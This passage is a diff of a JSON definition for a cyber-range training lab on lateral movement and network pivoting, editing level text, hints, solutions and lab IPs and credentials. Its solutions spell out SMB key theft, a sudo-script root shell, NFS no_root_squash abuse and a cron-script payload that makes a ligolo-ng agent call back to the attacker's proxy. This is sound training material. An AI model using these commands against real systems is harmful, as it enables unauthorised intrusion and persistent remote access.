@@ -10,7 +10,7 @@
     "order" : 0,
     "estimated_duration" : 0,
     "minimal_possible_solve_time" : null,
-    "content" : "Welcome to CR-18-n5b — Lateral Movement & Network Pivoting.\n\nYou're continuing the same engagement from CTF1, but the client has since segmented their network into three tiers: a DMZ facing the outside, an Internal tier behind it, and a locked-down Management tier holding the crown jewels. They believe this segmentation protects them. Your job is to test that belief.\n\nFrom your assessment machine you'll break into a DMZ host through a leaked file-share credential, escalate to root on it, then pivot twice — first into the Internal tier, then into Management — chaining a modern tunnelling tool and a classic file-sharing trust flaw along the way.\n\nYour assessment machine already has what you need: nmap, smbclient, an NFS client, an SSH client, and the ligolo-ng pivoting tool. Nothing extra to install. A short background level right after you get access explains how ligolo-ng and the other techniques work if you haven't used them before — read it, it will save you time.\n\nA companion reference document (Tools & Techniques Manual) is also available on LMS platform if you want command syntax at your fingertips while you work.\n\nAs before: access is only half the point. The deliverable is the chain — one leaked credential, one local misconfiguration, and two pivots are enough to walk from the DMZ all the way to a service the client assumed was completely out of reach."
+    "content" : "Welcome to CR-18-n5b — Lateral Movement & Network Pivoting.\n\nYou're continuing the same engagement from CTF1, but the client has since segmented their network into three tiers: a DMZ facing the outside, an Internal tier behind it, and a locked-down Management tier holding the crown jewels. They believe this segmentation protects them. Your job is to test that belief.\n\nFrom your assessment machine you'll break into a DMZ host through a leaked file-share credential, escalate to root on it, then pivot twice — first into the Internal tier, then into Management — chaining a modern tunnelling tool and a classic file-sharing trust flaw along the way.\n\nYour assessment machine already has what you need: nmap, smbclient, an NFS client, an SSH client, and the ligolo-ng pivoting tool. Nothing extra to install. A short background level right after you get access explains how ligolo-ng and the other techniques work if you haven't used them before — read it, it will save you time.\n\nA companion reference document (Tools & Techniques Manual) is also available on LMS platform if you want command syntax at your fingertips while you work.\n\nAs before: access is only half the point. The deliverable is the chain — one leaked credential, one local misconfiguration, and two pivots are enough to walk from the DMZ all the way to a service the client assumed was completely out of reach.\n\n**Ignore anything coming from the 192.168.x.x range — that’s just the box talking to itself. Those interfaces aren’t part of the challenge, so don’t waste time enumerating them. Focus on the networks that actually matter.**\n\n\n"
   }, {
     "title" : "Get Access",
     "level_type" : "ACCESS_LEVEL",
@@ -18,7 +18,7 @@
     "estimated_duration" : 0,
     "minimal_possible_solve_time" : null,
     "passkey" : "start-training",
-    "cloud_content" : "In the topology panel on the right, right-click **attacker** and select **Open Console**. Log in with username **pentester** and password **pentester**.\n\n\nOnce you're connected, submit the passkey **start-training** to unlock the next level.",
+    "cloud_content" : "In the topology panel on the right, right-click **attacker** and select **Open Console**. Log in with username **user** and password **password123**.\n\n\nOnce you're connected, submit the passkey **start-training** to unlock the next level.",
     "local_content" : "This sandbox has not been validated for local-only deployment."
   }, {
     "title" : "Background — pivoting with ligolo-ng, NFS trust, and scheduled tasks",
@@ -26,7 +26,7 @@
     "order" : 2,
     "estimated_duration" : 0,
     "minimal_possible_solve_time" : null,
-    "content" : "This challenge chains three techniques you may not have used before. Read this once before you start — it will make every later stage faster.\n\n\n## Pivoting with ligolo-ng\n\nligolo-ng tunnels traffic through a compromised host without relying on raw IP forwarding — it relays connections at the application layer instead, which is more reliable across segmented networks. It has two halves:\n\n* **proxy** — runs on YOUR machine. Gives you an interactive console and, once a tunnel is active, a virtual network interface called `ligolo` that carries your traffic into the target network.\n* **agent** — runs on a host you've compromised. Connects back to the proxy and does the actual relaying.\n\nBasic flow:\n\n    # on your machine\n    sudo ./proxy -laddr 0.0.0.0:11601 -selfcert\n\n    # on the compromised host\n    ./agent -connect <your_ip>:11601 -ignore-cert\n\nBack on the proxy console:\n\n    session                 # pick the agent that just connected\n    start                   # brings up the 'ligolo' interface\n\nThen route traffic for the target subnet into it:\n\n    sudo ip route add <subnet>/24 dev ligolo\n\nFrom here, ordinary tools (curl, nmap...) against that subnet are transparently tunnelled. Verify a tunnel with `curl`, not `ping` — ligolo-ng's ICMP support is inconsistent, but TCP relaying is what it's built for.\n\n**Chaining a second hop:** if you need to reach a network only visible from a host you've already pivoted through, add a listener on the existing session first:\n\n    listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601\n\nThen get a second agent running with `-connect` pointed at the *first* compromised host's own internal address (not your machine) and that listener port. It tunnels back automatically and appears as a new session.\n\n## NFS trust and no_root_squash\n\nNFS lets a server export a folder that other machines mount as if it were local. By default, if a connecting client claims to be root, the server maps that down to an unprivileged account — a safety measure called root squashing. An export configured with `no_root_squash` disables that protection: root on any permitted client is treated as genuine root on the export's contents. If you're root on a machine allowed to mount such a share, you can read root-only files on it directly, and write new root-owned files onto it.\n\n## Scheduled-task escalation\n\nWriting a root-owned file onto a share only matters if something executes it. A very common real-world pattern is a `cron` job on some other host that periodically runs a script it reads from that same share — routine automation the admins forgot was reachable by anyone with write access to the export. Spot the signs (a file with odd permissions, ownership, or a timestamp that keeps changing on its own), replace its contents with your own payload, and wait for the schedule to trigger it. Patience is part of the technique — expect a short wait, not an instant shell."
+    "content" : "This challenge chains three techniques you may not have used before. Read this once before you start — it will make every later stage faster.\n\n\n## Pivoting with ligolo-ng\n\nligolo-ng tunnels traffic through a compromised host without relying on raw IP forwarding — it relays connections at the application layer instead, which is more reliable across segmented networks. It has two halves:\n\n* **proxy** — runs on YOUR machine. Gives you an interactive console and, once a tunnel is active, a virtual network interface called `ligolo` that carries your traffic into the target network.\n* **agent** — runs on a host you've compromised. Connects back to the proxy and does the actual relaying.\n\nBasic flow:\n\n    # on your machine\n    sudo ./proxy -laddr 0.0.0.0:11601 -selfcert\n\n    # on the compromised host\n    ./agent -connect <your_ip>:11601 -ignore-cert\n\nBack on the proxy console:\n\n    session                 # pick the agent that just connected\n    start                   # brings up the 'ligolo' interface\n\nThen route traffic for the target subnet into it:\n\n    sudo ip route add <subnet>/24 dev ligolo\n\nFrom here, ordinary tools (curl, nmap...) against that subnet are transparently tunnelled. Verify a tunnel with `curl`, not `ping` — ligolo-ng's ICMP support is inconsistent, but TCP relaying is what it's built for.\n\n**Chaining a second hop:** if you need to reach a network only visible from a host you've already pivoted through, add a listener on the existing session first:\n\n    listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601\n\nThen get a second agent running with `-connect` pointed at the *first* compromised host's own internal address (not your machine) and that listener port. It tunnels back automatically and appears as a new session.\n\nWhen you start that second session, give it its own interface name — ligolo-ng won't let two sessions share one, and your first session already claimed `ligolo`:\n\n    start --tun ligolo1\n\nThen route the second network through that specific interface, not the original one:\n\n    sudo ip route add <second_subnet>/24 dev ligolo1\n\n## NFS trust and no_root_squash\n\nNFS lets a server export a folder that other machines mount as if it were local. By default, if a connecting client claims to be root, the server maps that down to an unprivileged account — a safety measure called root squashing. An export configured with `no_root_squash` disables that protection: root on any permitted client is treated as genuine root on the export's contents. If you're root on a machine allowed to mount such a share, you can read root-only files on it directly, and write new root-owned files onto it.\n\n## Scheduled-task escalation\n\nWriting a root-owned file onto a share only matters if something executes it. A very common real-world pattern is a `cron` job on some other host that periodically runs a script it reads from that same share — routine automation the admins forgot was reachable by anyone with write access to the export. Spot the signs (a file with odd permissions, ownership, or a timestamp that keeps changing on its own), replace its contents with your own payload, and wait for the schedule to trigger it. Patience is part of the technique — expect a short wait, not an instant shell."
   }, {
     "title" : "Breach the DMZ",
     "level_type" : "TRAINING_LEVEL",
@@ -35,19 +35,19 @@
     "minimal_possible_solve_time" : 5,
     "answer" : null,
     "answer_variable_name" : "smb_flag",
-    "content" : "Your assessment machine sits in the DMZ, at the edge of the client's network. The DMZ host in front of you runs a file-sharing service that shouldn't be readable by outsiders.\n\nYour objectives for this level:\n\n* Scan the DMZ host and identify the exposed file-sharing service.\n\n*Note: useful tools — nmap, smbclient.*\n\n* Connect to the share as a guest/anonymous user and see what's sitting in it. Administrators sometimes leave backup credentials in shares like this without realising anyone outside can read them.\n* Use whatever you find to authenticate to the DMZ host directly.\n\nLocate the **smb_flag** inside the share and submit it as your answer for this stage.",
-    "solution" : "* Scan the DMZ host — `nmap -p 445 <dmzhost_ip>` → SMB open.\n* List shares — `smbclient -N -L //<dmzhost_ip>/` → a guest-readable share appears.\n* Connect — `smbclient -N //<dmzhost_ip>/public`.\n* Inside the smbclient prompt: `get id_rsa`, `get README.txt`, `get smb_flag.txt`, then `exit`.\n* Fix permissions and log in — `chmod 600 id_rsa` then `ssh -i id_rsa dmzadmin@<dmzhost_ip>`.\n\nFindings:\n* DMZ host account: dmzadmin (key-based)\n* **smb_flag: ${ANSWER}**",
+    "content" : "Your assessment machine sits in the DMZ, at the edge of the client's network. The DMZ host in front of you runs a file-sharing service that shouldn't be readable by outsiders.\n\n**DMZ Host ip: 10.10.10.2**\n\nYour objectives for this level:\n\n* Scan the DMZ host and identify the exposed file-sharing service.\n\n*Note: useful tools — nmap, smbclient.*\n\n* Connect to the share as a guest/anonymous user and see what's sitting in it. Administrators sometimes leave backup credentials in shares like this without realising anyone outside can read them.\n* Use whatever you find to authenticate to the DMZ host directly - you will need this access at the next level.\n\nLocate the **smb_flag** inside the share and submit it as your answer for this stage.",
+    "solution" : "* Scan the DMZ host — `nmap -p 445 10.10.10.2` → Returns 445/tcp open  microsoft-ds ->SMB open.\n* List shares — `smbclient -N -L //10.10.10.2/` → a guest-readable share appears.\n* Connect — `smbclient -N //10.10.10.2/public` and then `ls` to view available files\n* Inside the smbclient prompt: `get id_rsa`, `get README.txt`, `get smb_flag.txt`, then `exit`.\n* Fix permissions and log in — `chmod 600 id_rsa` then `ssh -i id_rsa dmzadmin@10.10.10.2`.\n\nFindings:\n* DMZ host account: dmzadmin (key-based)\n* **smb_flag: ${ANSWER}**",
     "solution_penalized" : true,
     "hints" : [ {
+      "title" : "Look closer",
+      "content" : "Something useful is tucked away in those shared files — look closely, because the credentials you need are hidden there.",
+      "hint_penalty" : 5,
+      "order" : 2
+    }, {
       "title" : "Find the Open Door",
       "content" : "Scan the DMZ host for a file-sharing service before trying anything else.\n\nUseful tool: nmap.",
       "hint_penalty" : 2,
       "order" : 0
-    }, {
-      "title" : "Full Enumeration Commands",
-      "content" : "```\nnmap -p 445 <dmzhost_ip>\nsmbclient -N -L //<dmzhost_ip>/\nsmbclient -N //<dmzhost_ip>/public\n```\nOnce connected: `get id_rsa`, `get README.txt`, `get smb_flag.txt`. Then `chmod 600 id_rsa` and `ssh -i id_rsa dmzadmin@<dmzhost_ip>`.",
-      "hint_penalty" : 10,
-      "order" : 2
     }, {
       "title" : "Walk Through the Share",
       "content" : "SMB shares can often be listed and browsed without a password. Try connecting as a guest.\n\nUseful tool: smbclient (the -N flag skips the password prompt).",
@@ -60,13 +60,13 @@
     "variant_answers" : true,
     "reference_solution" : [ ],
     "mitre_techniques" : [ {
-      "technique_key" : "TA0001.T1078"
-    }, {
-      "technique_key" : "TA0007.T1046"
+      "technique_key" : "TA0006.T1552"
     }, {
       "technique_key" : "TA0001.T1133"
     }, {
-      "technique_key" : "TA0006.T1552"
+      "technique_key" : "TA0007.T1046"
+    }, {
+      "technique_key" : "TA0001.T1078"
     } ],
     "expected_commands" : [ "smbclient", "ssh", "nmap" ],
     "commands_required" : false
@@ -78,24 +78,19 @@
     "minimal_possible_solve_time" : 5,
     "answer" : null,
     "answer_variable_name" : "dmz_root_flag",
-    "content" : "The account you just accessed has no general administrator rights — but that doesn't mean it has none at all. Check exactly what it's permitted to do as another user.\n\nYour objectives for this level:\n\n* List the sudo privileges available to your current account.\n\n*Note: useful command — `sudo -l`.*\n\n* If a specific script can be run as root without a password, check whether you're also allowed to modify that script yourself. A command you can both edit and run as root is a full root shell in disguise.\n* Escalate to root, and make sure it's genuine root, not a shortcut that only looks like it. Some techniques (like setting the SUID bit on a shell) leave your real identity unprivileged even though it appears to work — and later tools in this lab will refuse to run if they detect that. Running a shell from inside the already-elevated script is the reliable way.\n\nLocate the **dmz_root_flag**, readable only by root, and submit it as your answer for this stage.",
-    "solution" : "* Check sudo rights — `sudo -l` → shows NOPASSWD access to one script, e.g. `/opt/netcheck/netcheck.sh`.\n* Check its permissions — `ls -la /opt/netcheck/netcheck.sh` → world-writable.\n* Overwrite it with a shell and run it via sudo:\n```\necho -e '#!/bin/bash\\nbash -i' > /opt/netcheck/netcheck.sh\nsudo /opt/netcheck/netcheck.sh\n```\n* Confirm it's genuine root — `whoami` and `id` should show `uid=0(root)` with no separate effective-only ID. (Setting the SUID bit on `/bin/bash` instead would leave your real UID unprivileged — avoid that method here, it breaks the pivoting tool you'll use in the next stage.)\n* Read the flag — `cat /root/dmz_root_flag.txt`.\n\n**dmz_root_flag: ${ANSWER}**",
+    "content" : "Use clues from previous level to authenticate directly to the DMZ host if you haven’t already.\n\nThe account you just accessed has no general administrator rights — but that doesn't mean it has none at all. Check exactly what it's permitted to do as another user.\n\nYour objectives for this level:\n\n* List the sudo privileges available to your current account.\n\n*Note: useful command — `sudo -l`.*\n\n* If a specific script can be run as root without a password, check whether you're also allowed to modify that script yourself. A command you can both edit and run as root is a full root shell in disguise.\n* Escalate to root, and make sure it's genuine root, not a shortcut that only looks like it. Some techniques (like setting the SUID bit on a shell) leave your real identity unprivileged even though it appears to work — and later tools in this lab will refuse to run if they detect that.\n\nLocate the **dmz_root_flag**, readable only by root, and submit it as your answer for this stage. ",
+    "solution" : "\n* Fix permissions and log in — `chmod 600 id_rsa` then `ssh -i id_rsa dmzadmin@10.10.10.2`.\n* Check sudo rights — `sudo -l` → shows NOPASSWD access to one script, e.g. `/opt/netcheck/netcheck.sh`.\n* Check its permissions — `ls -la /opt/netcheck/netcheck.sh` → world-writable.\n* Overwrite it with a shell and run it via sudo:\n```\necho -e '#!/bin/bash\\nbash -i' > /opt/netcheck/netcheck.sh\nsudo /opt/netcheck/netcheck.sh\n```\n* Confirm it's genuine root — `whoami` and `id` should show `uid=0(root)` with no separate effective-only ID. (Setting the SUID bit on `/bin/bash` instead would leave your real UID unprivileged — avoid that method here, it breaks the pivoting tool you'll use in the next stage.)\n* Read the flag — `cat /root/dmz_root_flag.txt`.\n\n**dmz_root_flag: ${ANSWER}**",
     "solution_penalized" : true,
     "hints" : [ {
       "title" : "A Script You Can Both Run and Rewrite",
-      "content" : "If sudo lets you run one specific script as root without a password, check its file permissions. If you can also edit it, replacing its contents gives you root when it runs.",
-      "hint_penalty" : 3,
-      "order" : 1
-    }, {
-      "title" : "Check Your Standing Orders",
-      "content" : "Before assuming you have no privileges at all, check exactly what sudo will let you do.\n\nUseful command: `sudo -l`.",
-      "hint_penalty" : 2,
+      "content" : "If sudo lets you run one specific script as root without a password, check its file permissions. If you can also edit it, replacing its contents gives you root when it runs.\n\n`/opt/netcheck/netcheck.sh` is your target\n",
+      "hint_penalty" : 5,
       "order" : 0
     }, {
       "title" : "Get It Right the First Time",
-      "content" : "```\necho -e '#!/bin/bash\\nbash -i' > /opt/netcheck/netcheck.sh\nsudo /opt/netcheck/netcheck.sh\nwhoami; id\n```\n`id` must show `uid=0(root)` with nothing else appended. Do NOT use `chmod +s /bin/bash` for this — it produces a shell that looks like root but isn't genuinely root, and it will cause confusing failures in the next stage.",
+      "content" : "```\necho -e '#!/bin/bash\\nbash -i' > /opt/netcheck/netcheck.sh\nsudo /opt/netcheck/netcheck.sh\nwhoami; id\n```\n\nid must show uid=0(root) with nothing else appended. Do NOT use chmod +s /bin/bash for this — it produces a shell that looks like root but isn't genuinely root, and it will cause confusing failures in the next stage.",
       "hint_penalty" : 10,
-      "order" : 2
+      "order" : 1
     } ],
     "incorrect_answer_limit" : 5,
     "attachments" : [ ],
@@ -115,24 +110,19 @@
     "minimal_possible_solve_time" : 10,
     "answer" : null,
     "answer_variable_name" : "pivot_flag",
-    "content" : "The DMZ host you now control has a second network interface — it also sits on the Internal tier, which your assessment machine cannot reach on its own. That makes it your pivot point.\n\nYour objectives for this level:\n\n* Confirm the DMZ host really is dual-homed, and note the Internal-facing address.\n* Set up ligolo-ng: run the proxy on your own machine and the agent on the DMZ host, connecting back to you. (See the background level if you need the syntax again.)\n\n*Note: the proxy and the agent both need to stay running at the same time — open a separate terminal window for each rather than closing one to start the other.*\n\n* Start the tunnel and route Internal-tier traffic into it from your own machine.\n* Confirm the pivot works by reaching a service on the Internal network that your assessment machine could never see directly.\n\nLocate the **pivot_flag** served by that Internal-tier service and submit it as your answer for this stage.",
-    "solution" : "* Open a terminal on your machine and start the proxy: `cd /opt/ligolo && sudo ./proxy -laddr 0.0.0.0:11601 -selfcert`. Leave it running.\n* Open a second terminal — SSH to the DMZ host, re-escalate, run the agent:\n```\nssh -i id_rsa dmzadmin@<dmzhost_ip>\nsudo /opt/netcheck/netcheck.sh\ncd /opt/ligolo\n./agent -connect <your_ip>:11601 -ignore-cert\n```\nLeave this running too.\n* Back in the first terminal, once you see the agent join: `session`, select it, then `start`.\n* Open a third terminal — route and test:\n```\nsudo ip route add <internal_subnet>/24 dev ligolo\ncurl http://<appserver_ip>:8080/\n```\n\n**pivot_flag: ${ANSWER}**",
+    "content" : "The DMZ host you now control has a second network interface — it also sits on the Internal tier, which your assessment machine cannot reach on its own. That makes it your pivot point.\n\nYour objectives for this level:\n\n* Confirm the DMZ host really is dual-homed, and note the Internal-facing address.\n* The DMZ host already has an ligolo‑ng agent planted on /opt/ligolo — that’s intentional. Treat it as part of the environment, not something you need to deploy. Run the proxy on your own machine, then SSH to the DMZ host and launch that agent, pointing it back at you.\n\n*Note: the proxy and the agent both need to stay running at the same time — open a separate terminal window for each rather than closing one to start the other.*\n\n* Start the tunnel and route Internal-tier traffic into it from your own machine.\n* Reach the target application server at **10.10.20.20 on port 8080** — a service your assessment machine could never see directly.\n\nLocate the **pivot_flag** served by that Internal-tier service and submit it as your answer for this stage.",
+    "solution" : "* use `ip a` from DMZ host to identify the Internal-facing address ->10.10.20.2/24\n* Open a terminal on your machine and start the proxy: `cd /opt/ligolo && sudo ./proxy -laddr 0.0.0.0:11601 -selfcert`. Leave it running.\n* Open a second terminal — SSH to the DMZ host, re-escalate, run the ligolo agent:\n```\nssh -i id_rsa dmzadmin@10.10.10.2\nsudo /opt/netcheck/netcheck.sh\ncd /opt/ligolo\n./agent -connect 10.10.10.10:11601 -ignore-cert\n```\nLeave this running too.\n* Back in the first terminal (your machine), once you see the agent join: `session`, select it, Hit Enter and then `start`.\n\n* Open a third terminal — route Internal-tier traffic into the tunnel and reach the target directly:\n\n```\nsudo ip route add 10.10.20.0/24 dev ligolo\ncurl http://10.10.20.20:8080/\n```\n\n**pivot_flag: ${ANSWER}**",
     "solution_penalized" : true,
     "hints" : [ {
-      "title" : "Two Processes, Two Windows",
-      "content" : "ligolo-ng's proxy (on your machine) and agent (on the DMZ host) both need to keep running at the same time. Open a separate terminal window for each instead of closing one to start the other.",
+      "title" : "One Foot in Each Room",
+      "content" : "Something in the DMZ isn't just visiting — it lives on both networks. Find its second face, then let it carry your traffic where you can't go alone.",
       "hint_penalty" : 3,
-      "order" : 1
-    }, {
-      "title" : "You're Already Halfway There",
-      "content" : "A host you control that sits on two networks can carry your traffic into the second one. Check its interfaces (`ip a`) and think about what that second address gives you.",
-      "hint_penalty" : 2,
       "order" : 0
     }, {
-      "title" : "Full Pivot Sequence",
-      "content" : "```\n# Terminal 1 (your machine):\ncd /opt/ligolo\nsudo ./proxy -laddr 0.0.0.0:11601 -selfcert\n\n# Terminal 2 (DMZ host, after re-escalating with the netcheck script):\ncd /opt/ligolo\n./agent -connect <your_ip>:11601 -ignore-cert\n\n# back in Terminal 1:\nsession\nstart\n\n# Terminal 3:\nsudo ip route add <internal_subnet>/24 dev ligolo\ncurl http://<appserver_ip>:8080/\n```\nUse curl to verify, not ping — ligolo-ng's ICMP relaying is unreliable even when the tunnel is working correctly.",
-      "hint_penalty" : 10,
-      "order" : 2
+      "title" : "Two Halves, One Tunnel",
+      "content" : "Proxy on your box, agent on theirs — both have to be breathing at the same time. Once they shake hands inside ligolo, pick the session and bring it up — that's when the virtual door actually opens on your side. Doors don't route traffic by themselves, though: tell your kernel which subnet should walk through the ligolo interface\n\n`sudo ip route add 10.10.20.0/24 dev ligolo`\n\n— then knock on the app server's door yourself.",
+      "hint_penalty" : 7,
+      "order" : 1
     } ],
     "incorrect_answer_limit" : 6,
     "attachments" : [ ],
@@ -140,9 +130,9 @@
     "variant_answers" : true,
     "reference_solution" : [ ],
     "mitre_techniques" : [ {
-      "technique_key" : "TA0007.T1046"
-    }, {
       "technique_key" : "TA0011.T1090"
+    }, {
+      "technique_key" : "TA0007.T1046"
     }, {
       "technique_key" : "TA0011.T1572"
     } ],
@@ -156,24 +146,24 @@
     "minimal_possible_solve_time" : 5,
     "answer" : null,
     "answer_variable_name" : "nfs_flag",
-    "content" : "Now that you can reach the Internal tier, look for a shared file service — the kind admins forget is trusted further than they think.\n\nYour objectives for this level:\n\n* Enumerate what's exported by the internal NFS server and note the access options attached to each share.\n\n*Note: useful command — `showmount -e <nfs_server_ip>`.*\n\n* Mount the share from a host that's actually on the Internal tier — the NFS server checks the real network address of whoever connects, not just whether the traffic eventually arrives.\n* If root-squashing has been disabled on the export, your existing root access should translate directly onto the share's contents.\n\nLocate the **nfs_flag**, readable only by root, inside the share and submit it as your answer for this stage.",
-    "solution" : "* Enumerate exports — `showmount -e <nfsserver_ip>` → shows the export with `no_root_squash` set.\n* From the DMZ host (which has a genuine Internal-tier address — the export won't accept your assessment machine directly, even through the tunnel):\n```\nmkdir -p /mnt/nfs\nmount -t nfs <nfsserver_ip>:/srv/share /mnt/nfs\ncat /mnt/nfs/.nfs_flag\n```\n\n**nfs_flag: ${ANSWER}**\n\nNote: because you're already root on the mounting host, and `no_root_squash` preserves that identity onto the export, the file is readable directly. Keep the share mounted — you'll write to it in the next stage.",
+    "content" : "Now that you can reach the Internal tier, look for a shared file service  at Internal NFS Server with ip 10.10.20.30 — the kind admins forget is trusted further than they think.\n\nYour objectives for this level:\n\n* Enumerate what's exported by the internal NFS server and note the access options attached to each share.\n\n*Note: useful command — `showmount -e 10.10.20.30`.*\n\n* Mount the share from the DMZ host that's actually on the Internal tier — the NFS server checks the real network address of whoever connects, not just whether the traffic eventually arrives.\n* If root-squashing has been disabled on the export, your existing root access should translate directly onto the share's contents.\n\nLocate the **nfs_flag**, readable only by root, inside the share and submit it as your answer for this stage.",
+    "solution" : "* Use DMZ host to Enumerate exports — `showmount -e 10.10.20.30` → shows the export with `no_root_squash` set.\n* From the DMZ host (which has a genuine Internal-tier address — the export won't accept your assessment machine directly, even through the tunnel):\n```\nmkdir -p /mnt/nfs\nmount -t nfs 10.10.20.30:/srv/share /mnt/nfs\nls -la /mnt/nfs/\ncat /mnt/nfs/.nfs_flag\n```\n\n**nfs_flag: ${ANSWER}**\n\nNote: because you're already root on the mounting host, and `no_root_squash` preserves that identity onto the export, the file is readable directly. Keep the share mounted — you'll write to it in the next stage.",
     "solution_penalized" : true,
     "hints" : [ {
+      "title" : "See What's Being Shared",
+      "content" : "Look for a file-sharing service on the Internal network NFS server and check what it exports and under what conditions.\n\nUseful command: showmount.",
+      "hint_penalty" : 2,
+      "order" : 0
+    }, {
       "title" : "Mind Where You Mount From",
-      "content" : "Some file shares check the real network address of whoever connects. If mounting fails with 'access denied', try it from a host that actually has an address on the Internal tier, not from your assessment machine.",
+      "content" : "Some file shares check the real network address of whoever connects. If mounting fails with 'access denied', try it from a DMZ host that actually has an address on the Internal tier, not from your assessment machine. ",
       "hint_penalty" : 3,
       "order" : 1
     }, {
       "title" : "Full Mount Sequence",
-      "content" : "From the DMZ host:\n```\nshowmount -e <nfsserver_ip>\nmkdir -p /mnt/nfs\nmount -t nfs <nfsserver_ip>:/srv/share /mnt/nfs\ncat /mnt/nfs/.nfs_flag\n```\nIf `mount` fails with 'bad option', install the NFS client package first.",
+      "content" : "From the DMZ host:\n```\nshowmount -e 10.10.20.30\nmkdir -p /mnt/nfs\nmount -t nfs 10.10.20.30:/srv/share /mnt/nfs\ncat /mnt/nfs/.nfs_flag\n```\n",
       "hint_penalty" : 10,
       "order" : 2
-    }, {
-      "title" : "See What's Being Shared",
-      "content" : "Look for a file-sharing service on the Internal network and check what it exports and under what conditions.\n\nUseful command: showmount.",
-      "hint_penalty" : 2,
-      "order" : 0
     } ],
     "incorrect_answer_limit" : 5,
     "attachments" : [ ],
@@ -183,9 +173,9 @@
     "mitre_techniques" : [ {
       "technique_key" : "TA0007.T1046"
     }, {
-      "technique_key" : "TA0001.T1199"
-    }, {
       "technique_key" : "TA0004.T1068"
+    }, {
+      "technique_key" : "TA0001.T1199"
     } ],
     "expected_commands" : [ "showmount", "mount" ],
     "commands_required" : false
@@ -197,24 +187,29 @@
     "minimal_possible_solve_time" : 10,
     "answer" : null,
     "answer_variable_name" : "mgmt_flag",
-    "content" : "The NFS server is dual-homed, just like the DMZ host was — it also sits on the Management tier. But you have no direct login to it. You'll have to make it come to you.\n\nYour objectives for this level:\n\n* Extend your existing tunnel so a second pivot point can connect back through it.\n\n*Note: useful command — `listener_add`.*\n\n* Look closely at what's sitting on the mounted share — something on the NFS server treats a specific file there as trusted, automated input, and runs it periodically as root. Find it.\n\n*Note: check file permissions, ownership, and whether anything changes on its own over time.*\n\n* Replace that file's contents with a command that connects a second ligolo-ng agent back to your listener. Then wait — this kind of automation runs on a timer, not on demand.\n* Once the second pivot connects, route Management-tier traffic into it and reach the final service.\n\nLocate the **mgmt_flag** served by the Management-tier service and submit it as your answer for this stage.",
-    "solution" : "* On the ligolo-ng proxy console (session from the first pivot still active): `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601`.\n* On the NFS share (still mounted from the previous stage), look for a script with unusual permissions or a changing timestamp — e.g. `.sync-check.sh`. Something on the NFS server executes it periodically as root.\n* Overwrite it with a payload that starts a second agent, pointed at the DMZ host's Internal address and the listener you just opened:\n```\ncat > /mnt/nfs/.sync-check.sh << 'EOF'\n#!/bin/bash\n/opt/ligolo/agent -connect <dmzhost_internal_ip>:11601 -ignore-cert &\nEOF\nchmod 755 /mnt/nfs/.sync-check.sh\n```\n* Wait up to about a minute, watching the proxy console — a new agent session appears on its own once the scheduled job fires.\n* Select and start it: `session`, then `start`.\n* Route and capture:\n```\nsudo ip route add <management_subnet>/24 dev ligolo\ncurl http://<mgmthost_ip>:8080/\n```\n\n**mgmt_flag: ${ANSWER}**",
+    "content" : "The NFS server is dual-homed, just like the DMZ host was — it also sits on the Management tier, at 10.10.30.30. But you have no direct login to it. You'll have to make it come to you.\n\nYour objectives for this level:\n\n* Extend your existing tunnel so a second pivot point can connect back through it. On the ligolo-ng proxy console (your first pivot session still active) add a new listener:\n\n`listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601`\n\n* On the mounted share on DMZ host, find the file the NFS server treats as trusted, automated input — something runs it periodically as root.\n\n*Note: check file permissions, ownership, and whether anything changes on its own over time.*\n\n* Replace its contents with this payload, which connects a second ligolo-ng agent back through your listener:\n\n```\ncat > /mnt/nfs/.sync-check.sh << 'EOF'\n#!/bin/bash\n/opt/ligolo/agent -connect 10.10.20.2:11601 -ignore-cert &\nEOF\nchmod 755 /mnt/nfs/.sync-check.sh\n```\nThen wait — this kind of automation runs on a timer, not on demand. Give it up to about a minute or two.\n\n* Once the second pivot connects (watch the proxy console — a new agent session appears on its own - ignore any warnings about name already exists etc), select it — but give it its own interface name when starting it, since `ligolo` is already in use by your first pivot session:\n\n```\nstart --tun ligolo1\n```\n\n* Route Management-tier traffic into that specific interface to reach the final service at 10.10.30.100:\n\n```\nsudo ip route add 10.10.30.0/24 dev ligolo1\n```\n\nLocate the **mgmt_flag** served by that service and submit it as your answer for this stage.",
+    "solution" : "* On the ligolo-ng proxy console (session from the first pivot still active): `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601`.\n* On the NFS share (still mounted from the previous stage), look for a script with unusual permissions or a changing timestamp — `.sync-check.sh`. Something on the NFS server executes it periodically as root.\n* Overwrite it with the payload:\n```\ncat > /mnt/nfs/.sync-check.sh << 'EOF'\n#!/bin/bash\n/opt/ligolo/agent -connect 10.10.20.2:11601 -ignore-cert &\nEOF\nchmod 755 /mnt/nfs/.sync-check.sh\n```\n* Wait up to about a minute, watching the proxy console — a new agent session appears on its own once the scheduled job fires.\n* Select it with `session`, then start it with a distinct interface name — `ligolo` is already bound to the first pivot session, so reusing it errors with \"a tunnel is already using this interface name\":\n```\nstart --tun ligolo1\n```\n* Route and capture, using that same interface:\n```\nsudo ip route add 10.10.30.0/24 dev ligolo1\ncurl http://10.10.30.100:8080/\n```\n\n**mgmt_flag: ${ANSWER}**",
     "solution_penalized" : true,
     "hints" : [ {
-      "title" : "Something Is Watching This Share",
-      "content" : "Root access to a share is only useful if something executes what you put on it. Look for a file with permissions, ownership, or a timestamp that suggests it's touched automatically and repeatedly — not something a person edits by hand. Scheduled jobs (cron) reading from shared storage are a classic real-world escalation path.",
-      "hint_penalty" : 3,
-      "order" : 1
-    }, {
-      "title" : "Open a Second Door",
-      "content" : "Your existing tunnel can carry a second connection back to you, not just the first. Look at ligolo-ng's listener_add command.",
+      "title" : "Order Matters",
+      "content" : "The listener has to exist before the second agent tries to dial into it — open it first, then plant the payload. If you write the script before the listener's up, the connection has nowhere to land.",
       "hint_penalty" : 2,
       "order" : 0
     }, {
-      "title" : "Full Second-Hop Sequence",
-      "content" : "```\n# proxy console:\nlistener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601\n\n# on the mounted share:\ncat > /mnt/nfs/.sync-check.sh << 'EOF'\n#!/bin/bash\n/opt/ligolo/agent -connect <dmzhost_internal_ip>:11601 -ignore-cert &\nEOF\nchmod 755 /mnt/nfs/.sync-check.sh\n```\nWait up to ~60 seconds and watch the proxy console for a new agent. Then `session`, `start`, `sudo ip route add <management_subnet>/24 dev ligolo`, and `curl http://<mgmthost_ip>:8080/`.",
-      "hint_penalty" : 10,
